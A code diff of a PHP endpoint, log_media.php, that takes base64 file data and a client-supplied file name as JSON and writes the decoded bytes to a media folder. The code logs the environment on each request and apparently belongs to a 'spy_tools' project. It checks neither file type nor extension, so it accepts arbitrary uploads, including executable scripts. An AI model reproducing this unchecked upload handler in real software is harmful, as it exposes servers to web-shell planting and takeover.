@@ -1,30 +1,38 @@
 <?php
 /**
  * log_media.php
- * 
- * Receives a file (image/audio/video) via POST and saves to /logs.
- * For demonstration only.
+ * Receives JSON with fileData (base64) + fileName, saves to logs/media.
+ * Logs environment.
  */
 
 require_once __DIR__ . '/logger.php';
 
-// Log environment
+// Log environment each time
 logEnvironment();
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
-    $file     = $_FILES['file'];
-    $tmpPath  = $file['tmp_name'];
-    $origName = basename($file['name']);
+// Expecting JSON in the form { "fileData": "data:...", "fileName": "..." }
+$rawInput = file_get_contents('php://input');
+$data = json_decode($rawInput, true);
 
-    $destination = LOG_DIR . '/' . $origName;
+if (!empty($data['fileData']) && !empty($data['fileName'])) {
+    $fileData = $data['fileData'];
+    $fileName = basename($data['fileName']);
 
-    if (move_uploaded_file($tmpPath, $destination)) {
-        // Optionally log a note
-        $note = "[MEDIA] Uploaded file: $origName";
-        logToFile(LOG_FILE_ENV, $note . "\n");
+    // Check if base64 is present
+    // Format: data:<mime>;base64,<encodedString>
+    $parts = explode(',', $fileData);
+    if (count($parts) === 2) {
+        $mimePart = $parts[0];
+        $base64Part = $parts[1];
+
+        $decoded = base64_decode($base64Part);
+        if ($decoded !== false) {
+            $targetPath = MEDIA_DIR . '/' . $fileName;
+            file_put_contents($targetPath, $decoded);
+            echo "Uploaded to $targetPath";
+            exit;
+        }
     }
 }
 
-// Redirect back or to another page
-header('Location: spy_tools.php');
-exit;
+echo "Invalid upload data.";
